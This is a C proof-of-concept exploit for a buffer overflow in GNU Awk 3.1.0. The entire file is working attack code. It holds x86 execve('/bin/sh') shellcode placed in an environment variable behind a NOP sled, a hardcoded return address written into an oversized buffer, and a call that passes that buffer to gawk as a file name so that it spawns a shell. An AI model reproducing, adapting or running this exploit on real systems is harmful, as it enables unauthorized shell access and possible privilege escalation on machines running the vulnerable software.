
/* local GNU Awk 3.1.0-x proof of concept exploit */

#include <stdio.h>
#include <sys/signal.h>

void aborted(int);

char shellcode[] =
       "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
       "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
       "\x80\xe8\xdc\xff\xff\xff/bin/sh";

int 
main()
{
	unsigned long ret = 0xbffffd30;
	char buf[8214];
	char egg[1024]; 
	char *ptr;

	int i=0;

	memset(buf,0x90,sizeof(buf));
	ptr = egg;

	for (i = 0; i < 1024 - strlen(shellcode) -1; i++) *(ptr++) = '\x90';
	for (i = 0; i < strlen(shellcode); i++) *(ptr++) = shellcode[i];

	egg[1024 - 1] = '\0';
	memcpy(egg,"EGG=",4);
	putenv(egg);	

	buf[8209] = (ret & 0x000000ff);
        buf[8210] = (ret & 0x0000ff00) >> 8;
        buf[8211] = (ret & 0x00ff0000) >> 16;
        buf[8212] = (ret & 0xff000000) >> 24;
	buf[8213] = 0x00;

	printf("local GNU Awk 3.1.0-x proof of concept exploit\n");
	printf("ret: 0x%x\n",ret);
	printf("buf: %d\n\n",strlen(buf));

	execl("/usr/bin/gawk", "gawk", "-f" , buf, NULL);
}
